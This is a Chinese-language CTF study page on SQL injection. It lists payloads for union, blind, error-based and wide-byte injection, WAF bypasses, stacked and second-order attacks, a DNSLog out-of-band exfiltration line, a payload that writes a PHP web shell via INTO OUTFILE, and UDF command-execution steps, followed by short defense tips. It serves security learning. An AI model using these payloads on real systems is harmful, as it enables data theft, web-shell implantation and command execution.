# SQL 注入

## 概述

SQL 注入（SQL Injection）是 Web 安全中最经典且危害最大的漏洞之一。攻击者通过在用户输入中注入恶意的 SQL 代码，操纵后端数据库查询，实现越权数据读取、篡改或管理员登录绕过。CTF 中 SQL 注入的题型覆盖从基础联合查询到高级 UDF 提权的完整链条。

## 常见攻击手法

### 1. 基本注入

- **检测方法**：
  - 单引号闭合：`'`、`"`、`')`、`"))`
  - 逻辑测试：`' and 1=1 --+`（正常）、`' and 1=2 --+`（异常）
  - 时间盲注：`' and sleep(5) --+` 判断响应时间
- **注释符**：`--+`、`#`、`/*`、`-- `（注意空格）
- **判断字段数**：`' order by 3 --+`，逐渐增加数字直到报错

### 2. 有回显注入 (Union Based)

- **联合查询**：`' union select 1,2,3 --+` 判断显示位
- **获取数据库信息**：
  - 数据库版本：`union select version(),2,3`
  - 当前数据库：`union select database(),2,3`
  - 当前用户：`union select user(),2,3`
- **获取表名**：`union select group_concat(table_name),2,3 from information_schema.tables where table_schema=database()`
- **获取字段名**：`union select group_concat(column_name),2,3 from information_schema.columns where table_name='flag'`
- **获取数据**：`union select flag,2,3 from flag`

### 3. 无回显盲注

- **布尔盲注**：
  - `' and substr((select flag from flag),1,1)='f' --+`
  - 使用 `ascii()`、`ord()` 逐字符比较
  - 二进制比较：`substr()`、`mid()`、`left()`、`right()`
- **时间盲注**：
  - MySQL: `' and if((select flag from flag) like 'f%', sleep(3), 0) --+`
  - PostgreSQL: `' AND (SELECT CASE WHEN (condition) THEN pg_sleep(3) ELSE pg_sleep(0) END) --+`
  - 脚本自动化：使用 Python 编写二分法盲注脚本
- **带外盲注 (OOB)**：
  - MySQL: `LOAD_FILE()`、`INTO OUTFILE` 配合 DNSLog
  - `' union select load_file(concat('\\\\', (select flag from flag), '.xxx.dnslog.cn\\a')) --+`

### 4. 报错注入

利用数据库函数报错时返回的调试信息提取数据。

- **MySQL 报错注入**：
  - `extractvalue(1, concat(0x7e, (select flag from flag)))`
  - `updatexml(1, concat(0x7e, (select flag from flag)), 1)`
  - `floor(rand(0)*2)` 配合 `count(*)` 的 group by 重复 key 报错
  - `exp(~(select * from (select flag from flag)x))`
- **MSSQL 报错注入**：`convert(int, (select flag from flag))`
- **PostgreSQL 报错注入**：`cast((select flag from flag) as int)`

### 5. WAF 绕过注入

- **注释混淆**：`/**/`、`/*!*/`、`--+`、`#`
- **大小写混合**：`SeLeCt * FrOm`
- **双写绕过**：`selselectect`（WAF 只过滤一次）
- **编码绕过**：URL 编码、双重 URL 编码、Unicode 编码
- **等价函数替换**：
  - `substr()` → `mid()` → `left()` → `right()`
  - `ascii()` → `ord()` → `hex()`
  - `sleep()` → `benchmark()`
  - `union` → `union all`
- **内联注释**：`/*!50000select*/`（MySQL 特有语法）

### 6. 宽字节注入

- **原理**：PHP 使用 `GBK` 编码，数据库使用 `GBK` 时，反斜杠 `\`（`%5c`）和特定字符（如 `%df`）组合形成一个新的中文字符，从而吃掉转义符
- **Payload**：`%df' union select 1,2,3 --+`（`%df%5c` 组成汉字 "運"）
- **前提条件**：PHP 连接 MySQL 时设置 `SET NAMES 'gbk'` 或使用 `set_charset('gbk')`

### 7. 堆叠注入

- **原理**：PHP 中使用 `mysqli_multi_query()` 时，支持执行多条 SQL 语句
- **Payload**：`'; select flag from flag; --+`
- **利用场景**：`show databases;`、`show tables;`、修改数据、创建账号

### 8. 文件操作

- **读文件**：`' union select load_file('/var/www/html/flag.txt') --+`
- **写文件**：`' union select "<?php system($_GET[1]);?>" into outfile '/var/www/html/shell.php' --+`
- **条件**：MySQL 的 `secure_file_priv` 参数需允许文件操作，当前用户需有 FILE 权限

### 9. 二次注入

- **原理**：第一次插入时对特殊字符做转义处理，但存储到数据库中的是原始数据；第二次查询时直接从数据库取出并拼接到 SQL 中，触发注入
- **典型场景**：注册用户名为 `admin'--`，登录后修改密码时触发注入

### 10. 约束攻击

- **利用数据库字符串截断特性**：MySQL 中 `varchar` 超过长度时自动截断，且不产生错误
- **典型场景**：注册 `admin   `（后面加空格直到超长），数据库截断后等于 `admin`，从而覆盖管理员账号

### 11. 无列名盲注

当 `information_schema` 不可用时（或其被禁用），可以使用无列名注入。

- **方法**：`select 1 union select * from flag` 将列名替换为数字
- **爆破**：`select `1` from (select 1,2,3 union select * from flag)x limit 1,1`
- **注意**：反引号中的数字对应列位置

### 12. 比较盲注

利用字符串比较操作符进行盲注，无需 `substr()`。

- **Payload**：`' or (select flag from flag) > 'f' --+`
- 利用 `>`、`<`、`=` 逐位比较，类似二分法

### 13. UDF 提权

- **原理**：MySQL 支持用户自定义函数（UDF），通过加载恶意 `.dll`/`.so` 文件实现命令执行
- **前提**：MySQL 版本 >= 5.0，插件目录可写，当前用户有 `CREATE FUNCTION` 权限
- **步骤**：
  1. 找到插件目录：`select @@plugin_dir`
  2. 写入动态库文件（通过 `INTO DUMPFILE`）
  3. 创建 UDF：`create function sys_exec returns integer soname 'udf.dll'`
  4. 执行命令：`select sys_exec('whoami')`

## 数据库差异

| 特性 | MySQL | MSSQL | PostgreSQL | SQLite |
|------|-------|-------|-----------|--------|
| 注释 | `--+`, `#` | `--` | `--` | `--` |
| 版本 | `@@version` | `@@version` | `version()` | `sqlite_version()` |
| 库名 | `database()` | `db_name()` | `current_database()` | 文件路径 |
| 报错 | `extractvalue, updatexml` | `convert()` | `cast()` | 无 |
| 堆叠 | 支持 | 支持 | 支持 | 支持 |

## 相关工具

| 工具 | 用途 |
|------|------|
| sqlmap | 自动化 SQL 注入检测与利用 |
| Burp Suite | 手工注入测试 |
| SQLiPy | sqlmap GUI 前端 |

## 防御建议

- 使用参数化查询（PreparedStatement）或 ORM
- 对用户输入进行严格的类型校验和白名单过滤
- 最小权限原则：数据库用户只授予必要的访问权限
- 关闭错误信息显示

## CTF 中的常见考点

- 联合注入获取 flag 表中数据
- 布尔/时间盲注自动化脚本编写
- 报错注入（extractvalue/updatexml）
- 宽字节注入绕过转义
- 堆叠注入实现文件操作

## 相关技能

- [NOSQL注入](NOSQL注入.md)
- [认证绕过](认证绕过.md)
- [暴力破解](暴力破解.md)
- [PHP](PHP.md)
- [Python](Python.md)
- [日志分析](../安全杂项/杂项日志分析.md)
- [漏洞利用](../渗透测试/漏洞利用.md)
